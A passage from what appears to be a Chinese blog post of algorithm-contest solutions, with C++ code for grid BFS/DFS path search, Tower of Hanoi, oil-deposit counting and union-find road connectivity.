class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="type">char</span> m[maxn][maxn];</span><br><span class="line"><span class="type">int</span> vis[maxn][maxn];</span><br><span class="line"><span class="type">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line"><span class="type">int</span> x, y;</span><br><span class="line"><span class="type">int</span> step;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bfs</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(vis, <span class="number">0</span>, <span class="built_in">sizeof</span>(vis));</span><br><span class="line">queue&lt;node&gt; q;</span><br><span class="line">node s = &#123;x, y, <span class="number">0</span>&#125;;</span><br><span class="line">q.<span class="built_in">push</span>(s);</span><br><span class="line">vis[x][y] = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> ans = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">node now = q.<span class="built_in">front</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">if</span>(m[now.x][now.y] == <span class="string">&#x27;E&#x27;</span>)&#123;</span><br><span class="line">ans = now.step;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="type">int</span> nx = now.x + dir[i][<span class="number">0</span>];</span><br><span class="line"><span class="type">int</span> ny = now.y + dir[i][<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>((m[nx][ny]==<span class="string">&#x27;*&#x27;</span>||m[nx][ny]==<span class="string">&#x27;E&#x27;</span>) &amp;&amp; vis[nx][ny]==<span class="number">0</span>)&#123;</span><br><span class="line">node tmp = &#123;nx, ny, now.step+<span class="number">1</span>&#125;;</span><br><span class="line">q.<span class="built_in">push</span>(tmp);</span><br><span class="line">vis[nx][ny] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> h, w;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; h &gt;&gt; w)&#123;</span><br><span class="line"><span class="keyword">if</span>(h==<span class="number">0</span> &amp;&amp; w==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">memset</span>(m, <span class="number">0</span>, <span class="built_in">sizeof</span>(m));</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; h; i++)&#123;</span><br><span class="line">cin &gt;&gt; m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> sx, sy;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; h; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; w; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(m[i][j] == <span class="string">&#x27;S&#x27;</span>)&#123;</span><br><span class="line">sx = i;</span><br><span class="line">sy = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> ans = <span class="built_in">bfs</span>(sx, sy);</span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>DFS也能解决，递归，时间很慢</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">100</span> + <span class="number">5</span>;</span><br><span class="line"><span class="type">char</span> m[maxn][maxn];</span><br><span class="line"><span class="type">int</span> vis[maxn][maxn];</span><br><span class="line"><span class="type">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> step)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(step &gt;= ans) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(m[x][y] == <span class="string">&#x27;E&#x27;</span>)&#123;</span><br><span class="line">ans = <span class="built_in">min</span>(ans, step);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="type">int</span> nx = x + dir[i][<span class="number">0</span>];</span><br><span class="line"><span class="type">int</span> ny = y + dir[i][<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>((m[nx][ny]==<span class="string">&#x27;*&#x27;</span>||m[nx][ny]==<span class="string">&#x27;E&#x27;</span>)&amp;&amp;vis[nx][ny] == <span class="number">0</span>)&#123;</span><br><span class="line">vis[nx][ny] = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">dfs</span>(nx, ny, step+<span class="number">1</span>);</span><br><span class="line">vis[nx][ny] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> w, h;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; w &gt;&gt; h)&#123;</span><br><span class="line"><span class="keyword">if</span>(w == <span class="number">0</span> &amp;&amp; h == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="type">int</span> sx, sy;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; w; i++)&#123;</span><br><span class="line">cin &gt;&gt; m[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; h; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(m[i][j] == <span class="string">&#x27;S&#x27;</span>)&#123;</span><br><span class="line">sx = i;</span><br><span class="line">sy = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ans = <span class="number">0x7ffffff</span>;</span><br><span class="line"><span class="built_in">dfs</span>(sx, sy, <span class="number">0</span>);</span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="hanoi塔问题">Hanoi塔问题</h3><h5 id="题目描述-32">题目描述</h5><p>(n阶Hanoi塔问题）假设有三个分别命名为A、B、C的塔座，在塔座A上插有n(n&lt;20)个直径大小各不相同、依小到大编号为1，2，…，n的圆盘。现要求将A轴上的n个圆盘移至塔座C上并仍按同样顺序叠排，圆盘移动时必须遵循下列规则：1）每次只能移动一个圆盘； 2）圆盘可以插在A、B、C中的任一塔座上；3）任何时刻都不能将一个较大的圆盘压在较小的圆盘之上。请通过编程来打印出移动的步骤.</p><h5 id="输入输出格式-30">输入输出格式</h5><h6 id="输入描述-32">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只有一组输入数据.输入数据<span class="built_in">N</span>(<span class="comment">;表示在开始时A塔座上的盘子数</span>),当输入<span class="number">0</span>时程序结束.</span><br></pre></td></tr></table></figure><h6 id="输出描述-32">输出描述:</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出移动的步骤.如&quot;<span class="selector-tag">A</span>--&gt;C&quot;,&quot;<span class="selector-tag">A</span>--&gt;<span class="selector-tag">B</span>&quot;等.每两的步骤之间有三个空格隔开,每输出<span class="number">5</span>个步骤就换行.详细的见Sample Output.</span><br></pre></td></tr></table></figure><p>递归解决</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> jud = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> a, <span class="type">char</span> b, <span class="type">char</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((jud+<span class="number">1</span>) % <span class="number">5</span> == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;%c--&gt;%c\n&quot;</span>, a, c);</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%c--&gt;%c   &quot;</span>, a, c);</span><br><span class="line">jud++;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">hanoi</span>(n<span class="number">-1</span>, a, c, b);</span><br><span class="line"><span class="built_in">hanoi</span>(<span class="number">1</span>, a, b, c);</span><br><span class="line"><span class="built_in">hanoi</span>(n<span class="number">-1</span>, b, a, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">hanoi</span>(n, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="石油储藏">石油储藏</h3><h5 id="题目描述-33">题目描述</h5><p>有一个GeoSurvComp地质勘探公司正在负责探测地底下的石油块。这个公司在一个时刻调查一个矩形区域，并且创建成一个个的格子用来表示众多正方形块。它然后使用测定设备单个的分析每块区域，决定是否有石油。一块有石油小区域被称为一个pocket，假设两个pocket是相邻的，然后他们就是相同石油块的一部分，石油块可能非常的大并且包涵很多的pocket。你的任务就是在一个网格中存在多少个石油块。输入首先给出图的大小，然后给出这个图。*代表没有石油，<span class="citation" data-cites="代表存在石油">@代表存在石油</span>。输出每种情况下石油块的个数。</p><h5 id="输入输出格式-31">输入输出格式</h5><h6 id="输入描述-33">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入包含一个或多个网格。 每个网格都以包含m和<span class="built_in">n</span>的行开始，网格中的行和列数为m和<span class="built_in">n</span>，以单个空格分隔。 如果m = <span class="number">0</span>，则表示输入结束。 否则为<span class="number">1</span> &lt;= m &lt;= <span class="number">100</span>和<span class="number">1</span> &lt;= <span class="built_in">n</span> &lt;=<span class="number">100</span>。这之后是m行，每行<span class="built_in">n</span>个字符（不计算行末字符）。 每个字符对应一个情节，要么是代表没有油的“ *”，要么是代表油囊的“ @”。</span><br></pre></td></tr></table></figure><h6 id="输出描述-33">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在水平，垂直或对角线上都算作相邻，输出每种情况下石油块的个数。</span><br></pre></td></tr></table></figure><p>dfs</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">100</span> + <span class="number">5</span>;</span><br><span class="line"><span class="type">char</span> m[maxn][maxn];</span><br><span class="line"><span class="type">int</span> vis[maxn][maxn];</span><br><span class="line"><span class="type">int</span> dir[<span class="number">8</span>][<span class="number">2</span>] = &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">vis[x][y] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line"><span class="type">int</span> nx = x + dir[i][<span class="number">0</span>];</span><br><span class="line"><span class="type">int</span> ny = y + dir[i][<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(m[nx][ny] == <span class="string">&#x27;@&#x27;</span> &amp;&amp; vis[nx][ny] == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">dfs</span>(nx, ny);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> w, h;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; w &gt;&gt; h)&#123;</span><br><span class="line"><span class="keyword">if</span>(w == <span class="number">0</span> &amp;&amp; h == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">memset</span>(m, <span class="number">0</span>, <span class="built_in">sizeof</span>(m));</span><br><span class="line"><span class="built_in">memset</span>(vis, <span class="number">0</span>, <span class="built_in">sizeof</span>(vis));</span><br><span class="line"><span class="comment">//for(int i = 0; i &lt; 100; i++)&#123;</span></span><br><span class="line"><span class="comment">//for(int j = 0; j &lt; 100; j++)&#123;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; vis[i][j] &lt;&lt; &quot; &quot;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; w; i++)&#123;</span><br><span class="line">cin &gt;&gt; m[i];</span><br><span class="line">&#125;</span><br><span class="line">ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; w; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; h; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(m[i][j]==<span class="string">&#x27;@&#x27;</span>&amp;&amp;vis[i][j] == <span class="number">0</span>)&#123;</span><br><span class="line">ans ++;</span><br><span class="line"><span class="built_in">dfs</span>(i, j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h1 id="图论">图论</h1><h3 id="畅通工程2">畅通工程2</h3><h5 id="题目描述-34">题目描述</h5><p>某省调查城镇交通状况，得到现有城镇道路统计表，表中列出了每条道路直接连通的城镇。省政府“畅通工程”的目标是使全省任何两个城镇间都可以实现交通（但不一定有直接的道路相连，只要互相间接通过道路可达即可）。问最少还需要建设多少条道路？</p><h5 id="输入输出格式-32">输入输出格式</h5><h6 id="输入描述-34">输入描述:</h6><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">测试输入包含若干测试用例。每个测试用例的第1行给出两个正整数，分别是城镇数目N ( &lt;<span class="number"> 1000 </span>)和道路数目M；随后的M行对应M条道路，每行给出一对正整数，分别是该条道路直接连通的两个城镇的编号。为简单起见，城镇从1到N编号。 </span><br><span class="line">    注意:两个城市之间可以有多条道路相通,也就是说</span><br><span class="line">   <span class="number"> 3 </span>3</span><br><span class="line">   <span class="number"> 1 </span>2</span><br><span class="line">   <span class="number"> 1 </span>2</span><br><span class="line">   <span class="number"> 2 </span>1</span><br><span class="line">    这种输入也是合法的</span><br><span class="line">    当N为0时，输入结束，该用例不被处理。</span><br></pre></td></tr></table></figure><h6 id="输出描述-34">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对每个测试用例，在1行里输出最少还需要建设的道路数目。</span><br></pre></td></tr></table></figure><p>并查集</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1000</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> f[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initial</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">f[i] = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x == f[x]) <span class="keyword">return</span> x;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">f[x] = <span class="built_in">find</span>(f[x]);</span><br><span class="line"><span class="keyword">return</span> f[x];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">initial</span>(n);</span><br><span class="line"><span class="type">int</span> x, y, ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line"><span class="type">int</span> fx = <span class="built_in">find</span>(x);</span><br><span class="line"><span class="type">int</span> fy = <span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span>(fx != fy)&#123;</span><br><span class="line">ans++;</span><br><span class="line">f[fx] = fy;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; n - ans - <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>加入merge</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1000</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> f[maxn], rank[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initial</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">f[i] = i;</span><br><span class="line">rank[i] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x == f[x]) <span class="keyword">return</span> x;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">f[x] = <span class="built_in">find</span>(f[x]);</span><br><span class="line"><span class="keyword">return</span> f[x];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> fx = <span class="built_in">find</span>(x), fy = <span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span>(rank[x] &lt;= rank[y])&#123;</span><br><span class="line">f[fx] = fy;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">f[fy] = fx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(rank[fx] == rank[fy] &amp;&amp; fx != fy)&#123;</span><br><span class="line">rank[fy]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">cin &gt;&gt; m;</span><br><span class="line"><span class="built_in">initial</span>(n);</span><br><span class="line"><span class="type">int</span> x, y, ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line"><span class="type">int</span> fx = <span class="built_in">find</span>(x);</span><br><span class="line"><span class="type">int</span> fy = <span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span>(fx != fy)&#123;</span><br><span class="line">ans++;</span><br><span class="line"><span class="built_in">merge</span>(fx, fy);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; n - ans - <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span 